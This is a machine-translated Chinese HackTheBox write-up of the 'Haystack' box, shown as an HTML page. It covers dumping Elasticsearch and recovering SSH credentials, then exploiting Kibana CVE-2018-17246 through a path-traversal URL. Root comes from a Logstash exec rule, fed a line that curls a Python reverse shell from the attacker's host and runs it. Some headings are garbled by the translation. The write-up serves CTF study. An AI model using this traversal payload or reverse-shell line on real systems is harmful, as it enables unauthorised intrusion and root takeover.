<html>
<head>
<title>Haystack — HackTheBox Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Haystack — HackTheBox详细报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/haystack-hackthebox-writeup-7dfd8a6fed5?source=collection_archive---------0-----------------------#2019-11-07">https://infosecwriteups.com/haystack-hackthebox-writeup-7dfd8a6fed5?source=collection_archive---------0-----------------------#2019-11-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="164d" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">Haystack本周退役，这是一个简单的难度框，我们可以在其中看到一些隐写内容，并从弹性搜索数据库中获得初始凭证。有了获得的凭证，我们可以SSH进入，并通过利用基巴纳中的CVE-2018–17246，我以基巴纳的身份获得shell。Kibana用户可以访问LogStash config，该配置被错误配置为允许以根用户身份通过错误配置的日志执行代码。</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi kf"><img src="../Images/eca494d30aee84799cfb3c8350b59beb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1196/format:webp/1*A2c_cI9YI80uTLklhZRjLA.png"/></div></figure><h1 id="d551" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">计数和侦察</h1><p id="4bd7" class="pw-post-body-paragraph lf lg iq lh b li lj jr lk ll lm ju ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated">让我们从nmap扫描开始，</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/25e0b67a1559bca93ccdb5ba6bc32e32.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*I2r0x_7vKWjMCxRf-TL9AA.png"/></div></div></figure><p id="4cf8" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">我们看到端口<strong class="lh ir"> 22、80、9200 </strong>是打开的。这里要注意的一点是<strong class="lh ir"> <em class="ml">端口80 </em> </strong>的内容类型为<code class="fe mm mn mo mp b"><strong class="lh ir">text/html</strong></code>，而<strong class="lh ir"> <em class="ml">端口9200 </em> </strong>的内容类型为<code class="fe mm mn mo mp b"><strong class="lh ir">application/json</strong></code>，我们可以认为它正在运行某种API。因为API通常在<code class="fe mm mn mo mp b">JSON</code>返回数据</p><h1 id="59e6" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">80 — HTTP</h1><p id="abeb" class="pw-post-body-paragraph lf lg iq lh b li lj jr lk ll lm ju ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated">网站看起来像这样，</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mq"><img src="../Images/d5da639b048c366d482dbd8d7b8cc37b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1fxGQHbRX9wAVEb_rGm8zg.png"/></div></div></figure><p id="2a9c" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">它有一个大海捞针的形象，就是这样。<code class="fe mm mn mo mp b"><strong class="lh ir">gobuster</strong></code>没发现什么有趣的东西。由于这是一个CTF挑战赛，我猜想图像一定有问题，因为图像是80端口上唯一的东西。当我第一次解决这个问题时，我运行了一些基本的隐写工具，但一无所获。我的一个朋友告诉我比这简单，然后我在上面运行<code class="fe mm mn mo mp b"><strong class="lh ir">strings</strong></code>工具来找到一个base64字符串。他们说是CTF，是CTF。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mr"><img src="../Images/f75974a0336ff2396e76851f64380781.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hplzuDd5z8_PC1bETzoIMg.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ms"><img src="../Images/a6721490ece0a9ba788546f3458ba7e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iEIQa8SqtV1Khs92BpwrfQ.png"/></div></div></figure><h1 id="a818" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">弹性搜索— 9200</h1><p id="06a9" class="pw-post-body-paragraph lf lg iq lh b li lj jr lk ll lm ju ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated">它正在运行<code class="fe mm mn mo mp b"><strong class="lh ir">version 6.4.2</strong></code>弹性搜索。我阅读了它的文档以获得一些概述。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mt"><img src="../Images/9d4c824101c070c9125a9b0558c0c427.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8g3RipAob7nK05luDkfigA.png"/></div></div></figure><p id="9210" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">我想办法转储数据库，无意中发现了https://github.com/taskrabbit/elasticsearch-dump和T21。</p><p id="0a05" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">看文档我们可以通过<br/><a class="ae mu" href="https://www.elastic.co/guide/en/elasticsearch/reference/6.4/getting-started-list-indices.html#getting-started-list-indices" rel="noopener ugc nofollow" target="_blank">https://www . elastic . co/guide/en/elastic search/reference/6.4/getting-started-list-indexes . html # getting-started-list-indexes</a>返回指数</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mv"><img src="../Images/358de294688403789e84373b4623eb50.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*upTl-c0he9-Fs-OgvfED4w.png"/></div></div></figure><p id="9040" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">我们可以看到我们有两个索引，<code class="fe mm mn mo mp b"><strong class="lh ir">quotes</strong></code>和<code class="fe mm mn mo mp b"><strong class="lh ir">bank</strong></code>。从<code class="fe mm mn mo mp b"><strong class="lh ir">elasticdump</strong></code>开始倾倒吧。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mw"><img src="../Images/e90efdfe834274fb1af9f751a90a4abd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KC3YZcs0MmQRE0bha1HGkw.png"/></div></div></figure><p id="5b68" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">让我们分析一下我们得到的转储。记住引用的信息<code class="fe mm mn mo mp b"><strong class="lh ir">the needle in the haystack is key</strong></code>。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mx"><img src="../Images/8d1c3d1c9b72a503f05ac477118584f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Oqb8kkZYb2xwKYBcx_mA_w.png"/></div></div></figure><p id="0b18" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">引号的最后几个字看起来像一个<strong class="lh ir"> </strong> <code class="fe mm mn mo mp b"><strong class="lh ir">base64 string</strong></code>。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi my"><img src="../Images/6a555f084d2be071302fe53c63eb3f85.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KVewtb5HDKGpz5PnrTbXtQ.png"/></div></div></figure><blockquote class="mz na nb"><p id="98c5" class="lf lg ml lh b li mg jr lk ll mh ju ln nc mi lq lr nd mj lu lv ne mk ly lz ma ij bi translated"><strong class="lh ir">找到凭证。<br/>用户:安全<br/>通行证:spanish.is.key </strong></p></blockquote><h1 id="213a" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">壳作为担保</h1><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nf"><img src="../Images/fe5277210574a9dc1987929b61808b8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N9wB2bDS17ncYQfWJqUPrA.png"/></div></div></figure><h1 id="183a" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">基巴纳列兵</h1><p id="97fb" class="pw-post-body-paragraph lf lg iq lh b li lj jr lk ll lm ju ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated">我们可以安全地假设我们正在处理一个<code class="fe mm mn mo mp b"><strong class="lh ir">ELK</strong></code>栈，它代表<br/> <strong class="lh ir"> Elasticsearch，Logstash，Kibana。</strong></p><p id="c819" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">查看正在运行的进程，我可以看到机器正在按预期运行kibana和logstash。</p><p id="31b4" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">因为kibana是在内部运行的，所以我用</p><pre class="kg kh ki kj gt ng mp nh ni aw nj bi"><span id="394f" class="nk ko iq mp b gy nl nm l nn no"><strong class="mp ir">ssh security@10.10.10.115 -L 5601:127.0.0.1:5601</strong></span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi np"><img src="../Images/a8529fb1021073adc73dbd98920903f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lN9Bu1a45gyCGHIS7imruw.png"/></div></div></figure><p id="b10e" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">我们可以断定它正在运行<code class="fe mm mn mo mp b"><strong class="lh ir">kibana 6.4.2</strong></code>。快速的谷歌搜索让我们来到<strong class="lh ir">CVE-2018–17246</strong>。<br/><a class="ae mu" href="https://github.com/mpgn/CVE-2018-17246" rel="noopener ugc nofollow" target="_blank">https://github.com/mpgn/CVE-2018-17246</a></p><h1 id="becb" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">壳牌作为基巴纳</h1><blockquote class="mz na nb"><p id="3d79" class="lf lg ml lh b li mg jr lk ll mh ju ln nc mi lq lr nd mj lu lv ne mk ly lz ma ij bi translated">浏览到网址，<br/><a class="ae mu" href="http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../../../../../../../../../tmp/test.js" rel="noopener ugc nofollow" target="_blank">http://localhost:5601/API/console/API _ server？SENSE _ VERSION = @ @ SENSE _ VERSION&amp;API =../../../../../../.../../../../../../../../../../../../tmp/test.js </a></p></blockquote><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nq"><img src="../Images/b51010554e73fa75eb06914e94329dbb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cbfUt2E7W8hRF3GAnnBc9g.png"/></div></div></figure><p id="2152" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">为了了解麋鹿栈，我们可以看看图片。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nr"><img src="../Images/4da0aa191a3f33bd83f97e861f27b122.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SFOLRUE5AFQnn_X-pF0f4Q.png"/></div></div></figure><blockquote class="mz na nb"><p id="37ac" class="lf lg ml lh b li mg jr lk ll mh ju ln nc mi lq lr nd mj lu lv ne mk ly lz ma ij bi translated">“ELK”是三个开源项目的缩写:Elasticsearch、Logstash和Kibana。Elasticsearch是一个搜索和分析引擎。Logstash是一个服务器端数据处理管道，它同时从多个来源获取数据，对其进行转换，然后将其发送到像Elasticsearch这样的“stash”。Kibana允许用户在Elasticsearch中用图表和图形可视化数据。</p><p id="9b50" class="lf lg ml lh b li mg jr lk ll mh ju ln nc mi lq lr nd mj lu lv ne mk ly lz ma ij bi translated">简而言之，<br/> E — Elasticsearch —是搜索和分析引擎<br/> L — Logstash —处理和存储日志<br/>K—ki Bana—elastic search中数据的可视化工具。</p></blockquote><p id="fceb" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">所以到目前为止，我们已经放弃了Elasticsearch，把shell作为Kibana的用户。我的猜测是在logstash中寻找有趣的东西。</p><h1 id="203b" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">Root权限</h1><p id="f9e7" class="pw-post-body-paragraph lf lg iq lh b li lj jr lk ll lm ju ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated"><code class="fe mm mn mo mp b"><strong class="lh ir">logstash</strong></code>的配置文件在<code class="fe mm mn mo mp b"><strong class="lh ir">/etc/logstash/conf.d</strong></code>中</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ns"><img src="../Images/2b5fac8b27b03a8dd2dbaae56a89dfe0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GyWkwE4ETfPGhMF6v5ztVw.png"/></div></div></figure><pre class="kg kh ki kj gt ng mp nh ni aw nj bi"><span id="03b2" class="nk ko iq mp b gy nl nm l nn no"><strong class="mp ir">input.conf</strong></span><span id="742c" class="nk ko iq mp b gy nt nm l nn no">input {<br/>        file {<br/>                path =&gt; "/opt/kibana/logstash_*"<br/>                start_position =&gt; "beginning"<br/>                sincedb_path =&gt; "/dev/null"<br/>                stat_interval =&gt; "10 second"<br/>                type =&gt; "execute"<br/>                mode =&gt; "read"<br/>        }<br/>}</span></pre><div class="nu nv gp gr nw nx"><a href="https://www.elastic.co/guide/en/logstash/current/configuration-file-structure.html" rel="noopener  ugc nofollow" target="_blank"><div class="ny ab fo"><div class="nz ab oa cl cj ob"><h2 class="bd ir gy z fp oc fr fs od fu fw ip bi translated">配置文件的结构|日志参考[7.4] |弹性</h2><div class="oe l"><h3 class="bd b gy z fp oc fr fs od fu fw dk translated">对于您想要添加到事件处理管道中的每种类型的插件，Logstash配置文件都有一个单独的部分…</h3></div><div class="of l"><p class="bd b dl z fp oc fr fs od fu fw dk translated">www.elastic.co</p></div></div><div class="og l"><div class="oh l oi oj ok og ol kl nx"/></div></div></a></div><p id="ae20" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated"><code class="fe mm mn mo mp b"><strong class="lh ir">input.conf</strong></code>正在<code class="fe mm mn mo mp b"><strong class="lh ir">/opt/kibana/</strong></code>中查找文件名类似<code class="fe mm mn mo mp b"><strong class="lh ir">logstash_*</strong></code>的文件。这每十秒钟运行一次。</p><pre class="kg kh ki kj gt ng mp nh ni aw nj bi"><span id="04a9" class="nk ko iq mp b gy nl nm l nn no"><strong class="mp ir">filter.conf</strong></span><span id="9718" class="nk ko iq mp b gy nt nm l nn no">filter{<br/>        if [type] == "execute" {<br/>                grok {<br/>                        match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }<br/>                }<br/>        }<br/>}</span></pre><p id="609a" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">如果类型为<code class="fe mm mn mo mp b"><strong class="lh ir">execute</strong></code>并且消息格式为<br/> <code class="fe mm mn mo mp b"><strong class="lh ir">Ejecutar commando : &lt;command&gt;</strong></code></p><pre class="kg kh ki kj gt ng mp nh ni aw nj bi"><span id="fade" class="nk ko iq mp b gy nl nm l nn no"><strong class="mp ir">output.conf</strong></span><span id="ccf5" class="nk ko iq mp b gy nt nm l nn no">if [type] == "execute" {<br/>                stdout { codec =&gt; json }<br/>                exec {<br/>                        command =&gt; "%{comando} &amp;"<br/>                }<br/>        }<br/>}</span></pre><p id="4253" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">根据<code class="fe mm mn mo mp b"><strong class="lh ir">output.conf</strong> </code>，类型<code class="fe mm mn mo mp b"><strong class="lh ir">execute</strong></code>的输入将使用<code class="fe mm mn mo mp b"><strong class="lh ir">exec</strong></code>插件运行。</p><p id="8922" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">收集完所有信息并拥有适当的权限后，让我们将反向shell放在<code class="fe mm mn mo mp b"><strong class="lh ir">/opt/kibana/logstash_test</strong></code>中。</p><p id="a381" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated"><code class="fe mm mn mo mp b"><strong class="lh ir">logstash_test</strong></code>的内容:</p><pre class="kg kh ki kj gt ng mp nh ni aw nj bi"><span id="051d" class="nk ko iq mp b gy nl nm l nn no"><strong class="mp ir">Ejecutar comando: curl 10.10.15.236/pyshell.py -o /tmp/kk.py;python /tmp/kk.py</strong></span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi om"><img src="../Images/bcb3be1dd66bc1393459b9cfbcb7b3f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mbJI9rPJ3RAsW0ik3Yg8lQ.png"/></div></div></figure><p id="bffe" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">干草堆扎根。</p><p id="0500" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated">感谢阅读，<br/> Preetham。</p></div><div class="ab cl on oo hu op" role="separator"><span class="oq bw bk or os ot"/><span class="oq bw bk or os ot"/><span class="oq bw bk or os"/></div><div class="ij ik il im in"><p id="91ac" class="pw-post-body-paragraph lf lg iq lh b li mg jr lk ll mh ju ln lo mi lq lr ls mj lu lv lw mk ly lz ma ij bi translated"><em class="ml">关注</em> <a class="ae mu" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="ml"> Infosec报道</em> </a> <em class="ml">获取更多此类精彩报道。</em></p><div class="nu nv gp gr nw nx"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="ny ab fo"><div class="nz ab oa cl cj ob"><h2 class="bd ir gy z fp oc fr fs od fu fw ip bi translated">信息安全报道</h2><div class="oe l"><h3 class="bd b gy z fp oc fr fs od fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="of l"><p class="bd b dl z fp oc fr fs od fu fw dk translated">medium.com</p></div></div><div class="og l"><div class="ou l oi oj ok og ol kl nx"/></div></div></a></div></div></div>    
</body>
</html>